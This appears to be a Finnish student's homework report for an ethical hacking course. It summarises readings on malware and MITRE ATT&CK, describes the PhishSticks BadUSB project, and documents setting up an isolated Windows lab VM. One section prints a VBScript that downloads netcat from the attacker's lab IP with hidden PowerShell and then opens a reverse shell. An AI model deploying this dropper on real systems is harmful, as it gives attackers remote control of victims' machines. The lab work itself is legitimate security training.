# h6 Attaaack
## x) Lue/katso/kuuntele ja tiivistä
 Yehoshua and Kosayev 2021: Antivirus Bypass Techniques, luku: Chapter 1: Introduction to the Security Landscape:

Erilaiset haittaohjelmat, niiden luokkittelu päätarkoituksien mukaan.

Suojautuminen: Virustorjuntaohjelmat. Päätelaitteen havaitseminen ja toiminta (EDR = endpoint detection and response). Palomuuri. Tunkeutumisen havaitsemis ja esto ohjelmat (IDS/IPS = Intrusion detection/prevention system). Tietovuodonestojärjestelmä (DLP = Data Leak Prevention)

Kommunikaatio kohteen ja komento&hallintapalvelimen välillä reverse tai bind shellillä.

PhishSticks youtube: Flipper zeron badusb payloadin avulla reverse shell kohde koneeseen. Muut demo videot kiristysohjelmasta ja digisparkista.

PhishSticks:

- Viikko 39. Erilähteiden avulla aluksi testi skiptien löytäminen ja tekeminen sekä python kiristysohjelman teko.
- Viikko 40. Suomalainen näppämistöasetus digisparkin keyloggeriin. Python-kiritysohjelman muuntaminen suoritettavaksi tiedostoksi. 
- Viikko 41. Yhden rivin payload -> digisparkin nopeampi suoritus. Reverse shelli ja kiristysohjelma melkein valmiina.
- Viikko 43. Keyloggerin ja kiritytohjelman kehittäminen. Alustan vaihto windows -> linux ongelmien ratkaisuna. Kirjatut tiedot spostin kautta hyökkääjälle vai HTTP POST kautta?
- Viikko 44. Demoja
- Viikko 47. Suojaustoimenpiteet: Poista PowerShell käytöstä käyttäjältä. Estä PowerShell windowsin palomuurilla. Poista windows Run käytöstä käyttäjältä. Lunnasohjelmasuojaus windows defenferistä. Irrotettavien laitteiden poistaminen käytöstä. 
- Viikko 48. Hyvä esitys oli.

MITRE ATT&CK

- Taktiikat: Hyökkääjän tavoite.
- Tekniikat: Miten hyökkääjä saavuttaa tavoitteen. 
- Alitekniikat: Yksityiskohtaisemmat kuvaukset, miten tekniikoita voidaan käyttää.

MITRE Att&ck Enterprise Matrix

- Execution: Serverless Execution(palvelimeton suorittaminen): Hyökkääjät voivat väärinkäyttää palveluntarjoajien tarjoamia palvelimettomia palveluita suorittaakseen haitallista koodia pilviympäristöissä. 
- Persistence: Modify Authentication Process(tunnistautumisprosessin muuttaminen): Hyökkääjät voivat muokata tunnistautumismekanismeja ja -prosesseja päästäkseen käsiksi käyttäjätunnuksiin tai mahdollistaakseen muutoin perustelemattoman pääsyn tileihin. Tähän kohtaan on listattu monia alitekniikoita, kuten password filter DLL, Multi-factor authentication jne.

## a) The OS pwns you. Asenna Windows virtuaalikoneeseen samaan verkkoon hyökkäyskoneen kanssa. Kokeile, että saat koneen irrotettua Internetistä.
Ensiksi windows 10 asennustiedoston lataaminen https://www.microsoft.com/en-us/evalcenter/download-windows-10-enterprise. Sen jälkeen lisäsin sen virtual box alustalle.

Lisäsin uuden virtuaalikoneen virtual boxiin paimalla 'New'. Annoin sille haluamani nimen. Valitsin oikean tyypin ja version eli windows 10 ja 'Next'.
![Alt text](/H6Attaaack/kuvat/h6.a1.png)

Muistin ja prosessorien asettaminen

![Alt text](/H6Attaaack/kuvat/h6.a2.png)

Tallennustilan asettaminen ja 'finish'

![Alt text](/H6Attaaack/kuvat/h6.a3.png)

Sen jälkeen avasin virtuaalikoneen ja lisäsin siihen ladatun asennustiedoston. Windows setup aukesi ja perus setuppaaminen omien tarpeiden mukaan kieli, näppäimistö jne. 

![Alt text](/H6Attaaack/kuvat/h6.a4.png)

Kun aukeaa windowsin setup 'Which type of installation do you want?' valitsin 'Custom...'. Sen jälkeen lisää alkuasetuksia ja windows saadaan käyttöön.

![Alt text](/H6Attaaack/kuvat/h6.a6.png)

Muutamalla luodun windows virtuaalikoneen virtual boxin 'network' asetuksia seuraavasti saadaan hyökkääjän ja kohteen välille omaverkko. Pitää valita se niminen 'Host-only adapter', jossa hyökkäävä kone on kiinni.

![Alt text](/H6Attaaack/kuvat/h6.a7.png)

Nyt windows kone on irroitettu internetistä, koska sillä on vain 'Host-only adapter' käytössä.

![Alt text](/H6Attaaack/kuvat/h6.a8.png)

## b) Trustme.lnk. Kokeile PhishSticksin revshell vihamielistä tiedostoa, joka avaa käänteisen shellin hyökkääjän koneelle. Selitä, mitä tapahtuu ja miksi. Testaa, että pysyt antamaan kohdekoneelle komentoja reverse shellin kautta.
En saa toimimaan. Revsh.vsb sisältö:

    Set objShell = CreateObject("Wscript.Shell")
    ' Download netcat from attacker IP
    downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.101/nc64.exe', '%TEMP%\nc64.exe')"""
    objShell.Run downloadCmd, 0, True
    
    ' Start reverse shell
    execCmd = "cmd /c powershell -Command ""Start-Process \""%TEMP%\nc64.exe\"" -ArgumentList '192.168.56.101', '9001', '-e', 'powershell' -WindowStyle Hidden"""
    objShell.Run execCmd, 0, True

    Set objShell = Nothing

![Alt text](/H6Attaaack/kuvat/h6.b1.png)

![Alt text](/H6Attaaack/kuvat/h6.b2.png)

## d) PageRank. Laita linkki raporttiisi [kurssisivun](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/) kommentiksi.




## lähteet
https://terokarvinen.com/2023/eettinen-hakkerointi-2023/

https://www.youtube.com/@phishsticks_pentest/videos

https://github.com/therealhalonen/PhishSticks/tree/master

https://attack.mitre.org/
